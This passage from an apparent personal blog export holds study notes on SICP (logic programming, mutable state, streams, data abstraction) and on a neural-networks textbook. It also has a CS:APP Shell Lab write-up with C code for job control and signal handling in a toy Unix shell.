evaluation by calling ambeval. 4.4 Logic Programmingcomputer science deals with imperative (how to) knowledge, whereas mathematics deals with declarative (what is) knowledge. Bias programming is about constructing algorithms for computing unidirectional functions (computations with well-defined inputs and outputs) Example of logical programming 1 2 (define (append x y) (if (null? x) y (cons (car x) (append (cdr x) y)))) append procedure can be regard as two rules translate into lisp 1 2 y = y append '() ( cons u v ) append y = ( cons u z ) IF v appedn y = z In a logic programming language, the programmer writes an append“procedure” by stating the two rules ( What is append ) about append given above. “How to” knowledge is provided automatically by the interpreter query language our logic programming language primitive: pattern ?x compound: and, or, not means of abstraction: rules 4.4.1 Deductive Information Retrieval Simple queries 1 2 3 4 5 ;;; Query input: (job ?x (computer programmer)) ;;; Query results: (job (Hacker Alyssa P) (computer programmer)) (job (Fect Cy D) (computer programmer)) Compound queries 1 2 (and (job ?person (computer programmer)) (address ?person ?where)) Rules 1 2 3 ;⟨ conclusion ⟩ is a pattern and ⟨ body ⟩ is any query. ; ?first satisfy conclusion than apply body (rule ⟨ conclusion ⟩ ⟨ body ⟩ ) Logic as programs ( implement our append in logical language ) 1 2 3 (rule (append-to-form () ?y ?y)) (rule (append-to-form (?u . ?v) ?y (?u . ?z)) (append-to-form ?v ?y ?z)) 4.4.2 How the Query System Works Implement query evaluator must perform some kind of search in order to match queries against facts and rules in the data base. Approaches nondeterministic program Search with the aid of streams Pattern matching evaluate primitive and compound Pattern Matcher Input a pattern a datum a frame that specifies bindings for various pattern variables. Pattern Matcher Output returns the given frame augmented by any bindings that may have been determined by the match. Compound queries Unification evaluate rules a generalization of pattern matching which both the “pattern” and the “datum” may contain variables. Applying rules similar to applying a procedure in the eval / apply 4.4.3 Is Logic Programming Mathematical Logic? No Query language provides a control structure that interprets the logical statements procedurally. Differences Take advantage in efficiency 1 2 3 ;while less supervisor than programmers (and (job ?x (computer programmer)) (supervisor ?x ?y)) (and (supervisor ?x ?y) (job ?x (computer programmer))) Infinite loops whether the system will find the simple answer (married Minnie Mickey) before it goes into the loop depends on implementation details concerning the order in which the system checks the items in the data base. 1 2 3 4 ;assert rules (assert! (rule (married ?x ?y) (married ?y ?x))) ;query (married Mickey ?who) Problems with not not 1 2 3 ;input empty frame where x unbound, \not filters out frames, return empty stream (and (not (job ?x (computer programmer))) (supervisor ?x ?y)) not of logic programming languages reflects the so-called closed world assumption that all relevant information has been included in the data base.（见脚注) 4.4.4 Implementing the Query System 4.4.4.1 The Driver Loop and Instantiation 4.4.4.2 The Evaluator 4.4.4.3 Finding Assertions by Pattern Matching 4.4.4.4 Rules and Unification 4.4.4.5 Maintaining the Data Base 4.4.4.6 Stream Operations 4.4.4.7 Query Syntax Procedures 4.4.4.8 Frames and Bindings もう…続けない…..なわけないだろ！]]></content>
      <categories>
        <category>Structure and Interpretation of Computer Programs</category>
      </categories>
      <tags>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[SICP-ch3] Modularity, Objects, and State]]></title>
    <url>%2F2018%2F04%2F18%2FSICP%2Fsicp3%2F</url>
    <content type="text"><![CDATA[ch-3 Modularity, Objects, and State3.1 Assignment and Local StateSystem decomposed into computational objects with time-varying state language must provide an assignment operator to enable us to change the value 3.1.1 Local State Variables model the situation of withdrawing money from a bank account 1 2 3 4 5 6 (define (make-withdraw balance) (lambda (amount) (if (&gt;= balance amount) (begin (set! balance (- balance amount)) balance) "Insufficient funds"))) 3.1.2 The Benefits of Introducing Assignment viewing systems as collections of objects with local state is a powerful technique for maintaining a modular design 1 2 3 4 5 6 7 (define rand (let ((x random-init)) (lambda () (set! x (rand-update x)) x))) (define (cesaro-test) (= (gcd (rand) (rand)) 1)) assignment encapsulates the state of the random-number generator within the rand procedure, so that the details of random-number generation remain independent of the rest of the program therefore easy to isolate the Monte Carlo idea 3.1.3 The Costs of Introducing Assignment the substitution model failed functional programming Programming without assignments procedure with the same arguments will produce the same result can be viewed as computing mathematical functions imperative programming using explicit assignment to update the values Pitfalls the order of the assignments several processes execute concurrently Sameness and change referentially transparent A language that supports the concept that “equals can be substituted for equals” violated when we include set! cannot determine sameness without observing the effects of change 3.2 The Environment Model of EvaluationA variable can no longer be considered to be a name for a value, but designate a “place” in which values can be stored Environment a sequence of frames each frame is a table of bindings, associate name and value 3.2.1 The Rules for Evaluation Define procedure a procedure is always a pair – consisting of some code and a pointer to an environment define creates definitions by adding bindings to frames Apply procedure create a new environment – containing a frame that binds the parameters to the arguments’ value 3.2.2 Applying Simple Procedures each call to square creates a new environment containing a binding for x 3.2.3 Frames as the Repository of Local State how procedures and assignment can be used to represent objects with local state 3.2.4 Internal Definitions make local procedure definitions a useful technique for modularizing programs local names do not interfere external names local procedures can access the arguments of the enclosing procedure 3.3 Modeling with Mutable DataMutators Data abstraction modify compound data objects 3.3.1 Mutable List Structure set-car! and set-cdr! modify car &amp; cdr pointer Sharing and identity use the predicate eq? to detect sharing in list structures 3.3.2 Representing Queues ( insert-queue! &lt;queue&gt; &lt;item&gt; ) ( delete-queue! &lt;queue&gt; &lt;item ) ​ 3.3.3 Representing Tables assoc returns the record that has the given key as its car lookup then checks to see that the resulting record returned by assoc is not false, and returns the value ( the cdr ) of the record insertfirst see if there is already a record, if not, consing key and value than insert in table 3.3.4 A Simulator for Digital Circuits event-driven simulation actions (“events”) trigger further events that happen at a later time, which in turn trigger more events wires carry digital signals function boxes connect wires carrying input signals to other output wires 1 2 3 4 5 6 7 8 9 10 11 (define (inverter input output) (define (invert-input) (let ((new-value (logical-not (get-signal input)))) (after-delay inverter-delay (lambda () (set-signal! output new-value))))) (add-action! input invert-input) 'ok) (define (after-delay delay action) (add-to-agenda! (+ delay (current-time the-agenda)) action the-agenda)) agenda contains a schedule of things to do propagateexecuting each procedure on the agenda in sequence 3.3.5 Propagation of Constraints 3.4 Concurrency: Time Is of the Essenceby introducing assignment, we are forced to admit time into our computational models Objects in the world are acting concurrently —all at once. 3.4.1 The Nature of Time in Concurrent Systems 3.4.2 Mechanisms for Controlling Concurrency using serializer 1 2 3 4 5 6 7 8 (define (make-account balance) (let ((protected (make-serializer))) (define (dispatch m) (cond ((eq? m 'withdraw) (protected withdraw)) ((eq? m 'deposit) (protected deposit)) ((eq? m 'balance) balance) (else (error "Unknown request: MAKE-ACCOUNT" m)))) dispatch)) With this implementation, two processes cannot be withdrawing from or depositing into a single account concurrently. Complexity concurrent programming can be treacherously difficult when there are multiple shared resources Implementing serializers synchronization mechanism called a mutex ( acquired &amp; release ) 1 2 3 4 5 6 7 8 9 10 11 12 (define (make-mutex) (let ((cell (list false))) (define (the-mutex m) (cond ((eq? m 'acquire) (if (test-and-set! cell) (the-mutex 'acquire))); retry ((eq? m 'release) (clear! cell)))) the-mutex)) ;actual implementation depends on how our system runs concurrent processes (define (test-and-set! cell) (if (car cell) true (begin (set-car! cell true) false))) Deadlock Each process is stalled forever, waiting for the other Concurrency, time, and communication The basic phenomenon here is that synchronizing different processes, establishing shared state, or imposing an order on events requires communication among the processes. 3.5 Streamsan alternative approach to modeling state Computational Object real-world computer real-world objects with local state computational objects with local variables time variation in the real world time variation in the computer implement the time variation of the states assignments to the local variables streams model change in terms of sequences that represent the time histories 3.5.1 Streams Are Delayed Lists Streams allows one to formulate programs as sequence manipulations, while ataining the efficiency of incremental computation. basic idea construct a stream only partially when accessed, automatically construct just enough more of itself to produce the required part preserving the illusion that the entire stream exists Delayed Evaluation cons-stream 1 2 (cons-stream ⟨ a ⟩ ⟨ b ⟩ == (cons ⟨ a ⟩ (delay ⟨ b ⟩ )) ) selectors 1 2 (define (stream-car stream) (car stream)) (define (stream-cdr stream) (force (cdr stream))) Implementing delay and force delay must package an expression so that it can be evaluated late 1 2 (delay ⟨ exp ⟩ ) == (lambda () ⟨ exp ⟩ ) force simply calls the procedure (of no arguments) 1 (define (force delayed-object) (delayed-object)) Optimization for forcing the same delayed object: Memoize 1 2 (delay ⟨ exp ⟩ ) == (memo-proc (lambda () ⟨ exp ⟩ )) 3.5.2 Infinite Streams 1 2 3 (define (integers-starting-from n) (cons-stream n (integers-starting-from (+ n 1)))) (define integers (integers-starting-from 1)) Defining streams implicitly 1 2 3 4 (define fibs (cons-stream 0 (cons-stream 1 (add-streams (stream-cdr fibs) fibs)))) 3.5.3 Exploiting the Stream Paradigm 1 2 3 4 5 (define (pi-summands n) (cons-stream (/ 1.0 n) (stream-map - (pi-summands (+ n 2))))) (define pi-stream (scale-stream (partial-sums (pi-summands 1)) 4)) sequence accelerator Even better, we can accelerate the accelerated sequence, and recursively accelerate that, and so on. Infinite streams of pairs interleave Streams as signals signal-processing systems that contain feedback loops 1 2 3 4 5 6 (define (integral integrand initial-value dt) (define int (cons-stream initial-value (add-streams (scale-stream integrand dt) int))) int) 3.5.4 Streams and Delayed Evaluation Unfortunately, stream models of systems with loops may require uses of delay beyond the “hidden” delay supplied by cons-stream . 1 2 3 4 5 6 7 8 9 10 11 12 ;does not work, because in the first line of solve the call to integral requires that the input dy be defined, which does not happen until the second line of solve (define (solve f y0 dt) (define y (integral dy y0 dt)) (define dy (stream-map f y)) y) ;Correct Definition (define (solve f y0 dt) (define y (integral (delay dy) y0 dt)) (define dy (stream-map f y)) y) Normal-order evaluation Delay and Force provides great programming flexibility but also can make our programs more complex normal-order evaluation language ( Section 4.2 ) all arguments to procedures are automatically delayed arguments are forced only when they are actually needed Mutability and Delayed evaluation do not mix well Unfortunately, including delays in procedure calls wreaks-havoc(破坏) with our ability to design programs that depend on the order of events such as programs that use assignment, mutate data, or perform input or output. 3.5.5 Modularity of Functional Programs and Modularity of Objects benefits of Assignment increase the modularity by encapsulating states Stream can provide an equivalent modularity without assignment. A functional-programming view of time Modeling with objects Functional programming language Assignment and Mutable objects Stream that represents the time history of states matches the way interacting with the world well-defined mathematical functions whose behavior does not change raise problems of constraining the order and syncronizing raise problems when we wish to design interactive systems We can model the world as a collection of separate, time-bound, interacting objects with state, or we can model the world as a single, timeless, stateless unity. Each view has powerful advantages, but neither view alone is completely satisfactory. A grand unification has yet to emerge]]></content>
      <categories>
        <category>Structure and Interpretation of Computer Programs</category>
      </categories>
      <tags>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[NN&DL-ch3] Improving the way neural networks learn]]></title>
    <url>%2F2018%2F04%2F15%2FNeuralNet%2F3%2F</url>
    <content type="text"><![CDATA[ch-3 Improving the way neural networks learnThe techniques we’ll develop in this chapter include a better choice of cost function, the cross-entropy cost function; four so-called “regularization” methods ( L1 and L2 regularization, dropout, and artificial expansion of the training data ), which make our networks better at generalizing beyond the training data; a better method for initializing the weights in the network; a set of heuristics to help choose good hyper-parameters ; The cross-entropy cost functionProblem of quadratic function Artificial neuron has a lot of difficulty learning when it’s badly wrong w = b = 2.0, η = 0.15 Quadratic cost function $ C = \frac { (y-a) ^ 2 }{ 2 } $ when the neuron’s output is close to 1 ( might be far away from the desired output ) the curve gets very flat, so $ σ′(z) $ gets very small. so $ ∂C/∂w $ and $ ∂C/∂b $ get very small. Introducing cross-entropy where $ a = σ(z) $ and $ z= \Sigma_j w_jx_j + b $ It’s a cost function : non-negative close to zero when a close to y avoids the problem of learning slowing down rates not controlled by $ σ’(z) $ Using the quadratic cost when we have linear neurons in the output layer all the neurons in the final layer are linear neurons outputs are simply $ a_j^L = y_j^L $, sigmoid not applied quadratic cost will not slowdown learning Softmax define a new type of output layer apply the so-called softmax function to z output is a set of positive numbers which sum up to 1, can be thought of as a probability distribution The learning slowdown problem log-likelihood cost function probability of $ a_y^L $ close to 1, cost close to 0 $ δ_j ^L = \partial C / \partial z_j^L $ Overfittingcost on the training data continue decrease while classification accuracy on the test data stops cost on the test data starts increase while classification accuracy on training data rises up to 100% It’s almost as though our network is merely memorizing the training set, without understanding digits well enough to generalize to the test set. Detect overfitting keeping track of accuracy on the test data as our network trains. using validation data: we may find hyper-parameters which fit particular peculiarities of the test_data if using test_data for detection. early stopping: stop training when accuracy no longer improving hold out method: validation_data is kept apart or “held out” from the training_data Avoid overfitting one of the best ways: increase the size of the training data regularization RegularizationL2 regularization ( weight decay )add an extra term on cost function Intuitively, the effect of regularization is to make it so the network prefers to learn small weights λ : compromising between finding small weights and minimizing the original cost function $ -\frac{ηλ}{n}*w $ weights shrink by an amount proportional to w Why does regularization help reduce overfitting? the 9th order model is really just learning the effects of local noise The smallness of the weights means that the network won’t change too much if we change a few random inputs here and there having a large bias doesn’t make a neuron sensitive to its inputs in the same way as having large weights We don’t have an entirely satisfactory systematic understanding of what’s going on, merely incomplete heuristics and rules of thumb. L1 regularization $ -\frac{ηλ}{n} * sgn(w) $weights shrink by a constant amount toward 0 when $|w| $ is large, shrink less; when $ |w| $ is small, shrink more Dropoutmodify the network itself rather than modifying the cost function start by randomly deleting half the hidden neurons forward-propagate the input and backpropagate the result, update network choosing a new random subset, repeat; Finally, run the full network by halving all weights. Heuristic Averaging the effects of a large number of different networks a neuron cannot rely on particular other neurons, robust to losing any individual connection Artificially expanding the training data The general principle is to expand the training data by applying operations that reflect real-world variation. An aside on big data and what it means to compare classification accuracies more training data can sometimes compensate for differences in the machine learning algorithm used Weight initializationUp to now choose w &amp; b using independent Gaussian random variables mean 0 and standard deviation 1 while z sum up over a total of 501 normalized Gaussian random variables z will have a very broad Gaussian distribution An easy way initialize more sharply peak mean 0 and standard deviation $ 1 / \sqrt {n_{in}} $ seems only speeds up learning, doesn’t change the final performance Connection with Regularization L2 regularization sometimes automatically gives us something similar to the new approach to weight initialization Handwriting recognition revisited: the code How to choose a neural network’s hyper-parameters?Problem when choose η=10.0 and λ=1000.0 classification accuracies are no better than chance Broad strategy examine network to achieve results better than chance Speed up experimentation stripping network down to the simplest increasing the frequency of monitoring When having a signal gradually decrease the frequency of monitoring experiment with a more complex architecture, adjust η and λ again Learning Rate First estimate the order of threshold for η so that training cost won’t oscillating or increasing control the step size in gradient descent, no need to monitor by accuracy Number of training Epochs Early stopping terminate when classification on validation data stops improving Learning rate schedule μ=0 there’s a lot of friction, the velocity can’t build upuse a large learning rate when weights are badly wrong later reduce as we make more fine-tuned adjustments The regularization parameter, λ starting initially λ=0.0 to determine η increase or decrease by factors of 10, get a fine-tune return and re-optimize η again Mini-batch size it’s possible to use matrix techniques to compute the gradient update for all examples in a mini-batch simultaneously using the larger mini-batch would speed things up Other techniques####Variations on stochastic gradient descent Hessian technique incorporates not just the gradient, but also information about how the gradient is changing $ H $ is a matrix known as the Hessian matrix, whose $ jkth $ entry is $ ∂^2C/∂w_j∂w_k $ the sheer size of the Hessian matrix make it difficult to compute Momentum-based gradient descent introduces a notion of “velocity” and “friction” replace the gradient descent update rule $ w→w′=w−η∇C$ by the “force” ∇C is now modifying v, and the velocity is controlling the rate of change of w. 1−μ as the amount of friction in the system. μ=1, there is no friction; μ=0 there’s a lot of friction, the velocity can’t build up; Other models of artificial neurontanh neuron ranges from -1 to 1, not 0 to 1 allows both positive and negative activations the activations in hidden layers would be equally balanced Rectified linear unit never cause saturate, no corresponding learning slowdown]]></content>
      <categories>
        <category>Neural Networks and Deep Learning</category>
      </categories>
      <tags>
        <tag>NeuralNet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[NN&DL-ch2] How the backpropagation algorithm works]]></title>
    <url>%2F2018%2F04%2F15%2FNeuralNet%2F2%2F</url>
    <content type="text"><![CDATA[ch-2 How the backpropagation algorithm worksdiscuss how to compute the gradient ( $\nabla C$ ) of the cost function Heart of backpropagation an expression for the partial derivative $∂ C /∂ w$ of the cost function C with respect to any weight w ( or bias b ) in the network tells us how quickly the cost changes whenwe change the weights and biases Warm up: a fast matrix-based approach to computing the output from a neural networkNotation Vectorized form apply the weight matrix to the activations, then add the bias vector, and finally apply the σ function $a^l=σ(w^la^{l−1}+b^l) =σ(z^l)$ The two assumptions we need about the cost function the cost function can be written as an average $ C=\frac{1}{n}∑_xC_x$ over cost functions $C_x$ for individual training examples, x. the cost can be written as a function of the outputs from the neural network: $cost C = C ( a^L )$ The four fundamental equations behind backpropagationDEF error $ δ^l_j $ Error in the output layer $δ^l$ Error $δ^l$ in terms of the error in the next layer, $δ^l+1$ Rate of change of the cost with respect to any bias Rate of change of the cost with respect to any weight Proof of the four fundamental equationsusing chain rule The backpropagation algorithm correctness: because the cost is a function of outputs To understand how the cost varies with earlier weights and biases we need to repeatedly apply the chain rule, , working backward through the layers to obtain usable expressions Backpropagation: the big picturea clever way of keeping track of small perturbations to the weights (and biases) as they propagate through the network, reach the output, and then affect the cost]]></content>
      <categories>
        <category>Neural Networks and Deep Learning</category>
      </categories>
      <tags>
        <tag>NeuralNet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[NN&DL-ch1] Using neural nets to recognize handwritten digits]]></title>
    <url>%2F2018%2F04%2F13%2FNeuralNet%2Fnndlch1%2F</url>
    <content type="text"><![CDATA[ch-1 Using neural nets to recognize handwritten digitsPerceptrons a type of artificial neuron a device that makes decisions by weighing up evidence perceptron in higher layer make a decision at a more complex and more abstract level many-layer network of perceptrons engage in sophisticated decision making weight real numbers expressing the importance of the respective inputs to the output bias a measure of how easy it is to get the perceptron to fire Use perceptrons to compute any logical function NAND gate is universal for computation Sigmoid neuronsLearning DEF: changing the weights and biases over and over to produce better and better output Problems of Perceptron step function a small change in the weights or bias of any single perceptron in the network can sometimes cause the output of that perceptron to completely flip, say from 0 to 1 sigmoid neuron Input take on values between 0 an 1 Output also between 0 and 1 which is $ σ( wx + b ) $ $ σ(z) ≡ \frac { 1 }{ 1 + e ^ {-z } } $ where $ z = wx + b $ $ σ’(z) = σ(z) (1- σ(z) ) $ The smoothness of σ means that small changes $Δw_j$ in the weights and $Δb$ in the bias will produce a small change $Δoutput$ in the output from the neuron. $ \Delta output \approx \Sigma _j \frac {\partial output}{ \partial w_j} \Delta w_j + \frac {\partial output}{ \partial b} \Delta b $ The architecture of neural networks input layer, output layer, hidden layer Feed Forward Neural Networks no loops in the network Recurrent neural networks feedback loops are possible have neurons which fire for some limited duration of time, before becoming quiescent A simple network to classify handwritten digitsTo recognize individual digits we will use a three-layer neural network Input: 28 by 28 pixel = 784 Output: 10 neurons represent for 0 to 9 Hidden layer: n = 15 as an example Output layer: why use 10 numbers rather than 4 bits? there’s no easy way to relate that most significant bit to simple shapes ?A way to think about Hidden layer weighting up evidence and produce an abstraction Learning with gradient descentcost function DEF: $ C( w,b ) ≡ \frac{1}{2n} ∑ ∥y(x) − a ∥^2 $ $y(x) = (0, 0, 0, 0, 0, 0, 1, 0, 0, 0)^T$ : Desired output a : Output from network x : input, n: number of inputs, w : weight, b : bias Aim of our training algorithm minimize the cost C (w, b) as a function of the weights and biases Why not try to maximize that number? the number of images correctly classified is not a smooth function of the weights and biases Gradient Descent Algorithm repeatedly compute the gradient ∇C , and then to move in the opposite direction $ ΔC ≈ \frac { ∂ C }{∂ w_k} Δ w_k + \frac{ ∂ C } {∂ b_l} Δ b_l ≈ ∇C ⋅ Δv.$ choose Δv so as to make ΔC negative $Δv = −η∇C $ apply to each component $ w_k → w_k’ = w_k − η \frac{∂ C}{∂w_k }$ $ b_l → b_l’ = b_l − η \frac{∂ C}{∂b_l }$ Problem In practical implementations, η is often varied so that it remains a good approximation, but the algorithm is too slow Stochastic gradient descent used to speed up learning estimate the gradient $ ∇C $ by computing $ ∇C_x $ for a small sample of randomly chosen training inputs $ w_k → w_k’ = w_k − \frac{η}{m} \Sigma_j\frac{∂ C}{∂w_k }$ $ b_l → b_l’ = b_l − \frac{η}{m}\Sigma_j \frac{∂ C}{∂b_l }$ Toward deep learningThe weights and biases in the network were discovered automatically. And that means we don’t immediately have an explanation of how the network does what it does A heuristic we could use is to decompose the problem into sub-problems early layers answering very simple and specific questions about the input image later layers building up a hierarchy of ever more complex and abstract concepts]]></content>
      <categories>
        <category>Neural Networks and Deep Learning</category>
      </categories>
      <tags>
        <tag>NeuralNet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch8] Shell Lab]]></title>
    <url>%2F2018%2F03%2F21%2FCSAPP%2Fshell%2F</url>
    <content type="text"><![CDATA[[CS:APP-ch8] Shell Labhttp://csapp.cs.cmu.edu/3e/labs.html http://condor.depaul.edu/glancast/374class/hw/shlab-readme.html https://github.com/zhoudiqiu/Shell-lab/blob/master/lab5/tsh.c Targetimplement eval, builtin_cmd, do_bgfg, waitfg sigchld_handler, sigint_handler, sigtstp_handler 0. Preparationtshref: 正确的参考shell，要求自己实现后的shell和它的结果一样 make test01用trace01.txt来验证结果，可以参考make rtest01的结果 gdb makefile去掉参数O2,加上-g 1. void eval ( char*cmdline )原型：p755 If command is a built-in command, the shell program handles it immediately. Otherwise, the shell creates a child process to load and execute the program for command. Hint In eval, the parent must use sigprocmaskto block SIGCHLD signals before it forks the child, then unblock these signals, again using sigprocmask after it adds the child to the job list by calling addjob. Since children inherit the blocked vectors of their parents, the child must be sure to then unblock SIGCHLD signals before it execs the new program. The parent needs to block the SIGCHLD signals in this way in order to avoid the race condition where the child is reaped by sigchld_handler (and thus removed from the job list) before the parent calls addjob. After the fork, but before the execve, the child process should call setpgid(0, 0), which puts the child in a new process group whose group ID is identical to the child’s PID. This ensures that there will be only one process, your shell, in the foreground process group. When you type ctrl-c, the shell should catch the resulting SIGINT and then forward it to the appropriate foreground job (or more precisely, the process group that contains the foreground job). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 /* * eval - Evaluate the command line that the user has just typed in * * If the user has requested a built-in command (quit, jobs, bg or fg) * then execute it immediately. Otherwise, fork a child process and * run the job in the context of the child. If the job is running in * the foreground, wait for it to terminate and then return. Note: * each child process must have a unique process group ID so that our * background children don't receive SIGINT (SIGTSTP) from the kernel * when we type ctrl-c (ctrl-z) at the keyboard. */ void eval ( char *cmdline ) &#123; pid_t pid; sigset_t mask; char *argv[ MAXARGS ]; //Parse the command line and build the argv array int bg = parseline ( cmdline, argv ); if ( !builtin_cmd ( argv ) ) &#123; // blocking SIGCHLD, race sigemptyset ( &amp;mask ); sigaddset ( &amp;mask, SIGCHLD ); sigprocmask ( SIG_BLOCK, &amp;mask, NULL ); // fork new process if ( ( pid = fork () ) &lt; 0 ) unix_error ( "fork error" ); // child process else if ( pid == 0 ) &#123; // unblock SIGCHLD in child process sigprocmask ( SIG_UNBLOCK, &amp;mask, NULL ); // ensures that there will be only one process setpgid ( 0, 0 ); // execute command if ( execvp ( argv[ 0 ], argv ) &lt; 0 ) &#123; printf ( "%s: Command not found\n", argv[ 0 ] ); exit ( 1 ); &#125; // parent &#125; else &#123; addjob ( jobs, pid, bg ? BG : FG, cmdline ); // get SIGCHLD back after add job sigprocmask ( SIG_UNBLOCK, &amp;mask, NULL ); if ( !bg ) &#123; // reap when job terminated ( send signal SIGCHILD ) waitfg ( pid ); &#125; else &#123; //[1] (6325) ./myspin 1 &amp; printf ( "[%d] (%d) %s", pid2jid ( pid ), pid, cmdline ); &#125; &#125; &#125; return; &#125; 2.int builtin_cmd( char **argv) Four commands are to be built-in in the shell quit: exit the shell. jobs: List the running and stopped background jobs. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* * builtin_cmd - If the user has typed a built-in command then execute * it immediately. */ int builtin_cmd ( char **argv ) &#123; if ( strcmp ( argv[ 0 ], "quit" ) == 0 ) &#123; exit ( 0 ); &#125; else if ( strcmp ( argv[ 0 ], "jobs" ) == 0 ) &#123; listjobs ( jobs ); return 1; &#125; else if ( !strcmp ( argv[ 0 ], "fg" ) || !strcmp ( argv[ 0 ], "bg" ) ) &#123; do_bgfg ( argv ); return 1; &#125; return 0; /* not a builtin command */ &#125; 3. void waitfg( pid_t pid ) shell should wait for foreground process This function should wait by sleeping for 1 second repeatedly until the specified process is no longer the foreground process (state = FG) Hints In waitfg, use a busy loop around the sleep function. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* * waitfg - Block until process pid is no longer the foreground process */ void waitfg ( pid_t pid ) &#123; struct job_t *job = getjobpid ( jobs, pid ); if ( pid == 0 ) return; if ( job != NULL ) &#123; // sleep while ( pid == fgpid ( jobs ) ) &#123; &#125; &#125; return; &#125; 4. void do_bgfg( char **argv ) bg &lt;job&gt;: Change a stopped background job to a running background job. fg &lt;job&gt;: Change a stopped or running background job to a running in the foreground. The bg &lt;job&gt; command restarts \ by sending it a SIGCONTsignal, and then runs it in the background. The \ argument can be either a PID or a JID. The fg &lt;job&gt;command restarts \ by sending it a SIGCONTsignal, and then runs it in the foreground. The \ argument can be either a PID or a JID. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /* * do_bgfg - Execute the builtin bg and fg commands */ void do_bgfg ( char **argv ) &#123; struct job_t *job; char *tmp; int jid; pid_t pid; tmp = argv[ 1 ]; // unvalid id if ( tmp == NULL ) &#123; printf ( "%s command requires PID or %%jobid argument\n", argv[ 0 ] ); return; &#125; // jid if ( tmp[ 0 ] == '%' ) &#123; // string to integer jid = atoi ( &amp;tmp[ 1 ] ); job = getjobjid ( jobs, jid ); // unvalid jid if ( job == NULL ) &#123; //%2: No such job printf ( "%s: No such job\n", tmp ); return; &#125; else &#123; pid = job-&gt;pid; &#125; &#125; // pid else if ( isdigit ( tmp[ 0 ] ) ) &#123; pid = atoi ( tmp ); job = getjobpid ( jobs, pid ); // unvalid pid if ( job == NULL ) &#123; //(2): No such process printf ( "(%d): No such process\n", pid ); return; &#125; &#125; else &#123; printf ( "%s: argument must be a PID or %%jobid\n", argv[ 0 ] ); return; &#125; // awakened by the receipt of a SIGCONT signal. kill ( -pid, SIGCONT ); if ( !strcmp ( "fg", argv[ 0 ] ) ) &#123; // foreground, shell wait for it job-&gt;state = FG; waitfg ( job-&gt;pid ); &#125; else &#123; job-&gt;state = BG; // print printf ( "[%d] (%d) %s", job-&gt;jid, job-&gt;pid, job-&gt;cmdline ); &#125; return; &#125; 5.void sigchld_handler( int sig )This is the shell’s handler for theSIGCHLD signal. Hints In sigchld_handler, use exactly one call to waitpid 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 /* * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever * a child job terminates (becomes a zombie), or stops because it * received a SIGSTOP or SIGTSTP signal. The handler reaps all * available zombie children, but doesn't wait for any other * currently running children to terminate. */ void sigchld_handler ( int sig ) &#123; pid_t pid; int status; // wait for all child to end while ( ( pid = waitpid ( -1, &amp;status, WNOHANG | WUNTRACED ) ) &gt; 0 ) &#123; // child currently stopped if ( WIFSTOPPED ( status ) ) &#123; // change state struct job_t *job = getjobpid ( jobs, pid ); job-&gt;state = ST; int jid = pid2jid ( pid ); // Job [2] (14171) stopped by signal 20 printf ( "Job [%d] (%d) stopped by signal %d\n", jid, pid, WSTOPSIG ( status ) ); &#125; // child terminated because of a signal else if ( WIFSIGNALED ( status ) ) &#123; int jid = pid2jid ( pid ); // INT // Job [1] (13253) terminated by signal 2 printf ( "Job [%d] (%d) terminated by signal %d\n", jid, pid, WTERMSIG ( status ) ); deletejob ( jobs, pid ); &#125; // child terminated normally else if ( WIFEXITED ( status ) ) &#123; deletejob ( jobs, pid ); &#125; &#125; return; &#125; 6. void sigint_handler ( int sig )Hints When you implement your signal handlers, be sure to send SIGINT and SIGTSTP signals to the entire foreground process group, using -pid instead of pid in the argument to the kill function.The sdriver.pl program tests for this error. 1 2 3 4 5 6 7 8 9 10 11 12 13 /* * sigint_handler - The kernel sends a SIGINT to the shell whenver the * user types ctrl-c at the keyboard. Catch it and send it along * to the foreground job. */ void sigint_handler ( int sig ) &#123; pid_t pid = fgpid ( jobs ); if ( pid != 0 ) &#123; kill ( -pid, sig ); &#125; return; &#125; 7.void sigtstp_handler ( int sig )1 2 3 4 5 6 7 8 9 10 11 12 13 /* * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever * the user types ctrl-z at the keyboard. Catch it and suspend the * foreground job by sending it a SIGTSTP. */ void sigtstp_handler ( int sig ) &#123; pid_t pid = fgpid ( jobs ); if ( pid != 0 ) &#123; kill ( -pid, sig ); &#125; return; &#125;]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[SICP-ch2] Building Abstractions with Data]]></title>
    <url>%2F2018%2F03%2F10%2FSICP%2Fsicp2%2F</url>
    <content type="text"><![CDATA[SICP-ch2 Building Abstractions with Databuilding abstractions by forming compound data Intro 2.1 data abstraction erect abstraction barriers 2.2 data == procedures, sequences, closure, conventional interface 2.3 symbols as elementary data 2.4 generic operations, data directed programming, additivity 2.5 implement a package 2.1 Introduction to Data AbstractionData abstraction isolating ( the parts of a program that deal with how data objects are represented ) from ( the parts of a program that deal with how data objects are used ) Construct abstract data use constructors, selectors as interface 2.1.1 Example: Arithmetic Operations for Rational Numbers assume the constructor and selectors are available 1 numer , denom , make-rat use them to express rational operation 1 2 3 4 (define (add-rat x y) (make-rat (+ (* (numer x) (denom y)) (* (numer y) (denom x))) (* (denom x) (denom y)))) implement representation 1 2 3 (define (make-rat n d) (cons n d)) (define (numer x) (car x)) (define (denom x) (cdr x)) 2.1.2 Abstraction Barriers 2.1.3 What Is Meant by Data? DEF: some collection of selectors and constructors together with specified conditions for the representation Example Pairs z = ( x, y ) selector: car, cdr constructor: cons condition: if z = ( x, y ) =&gt; ( 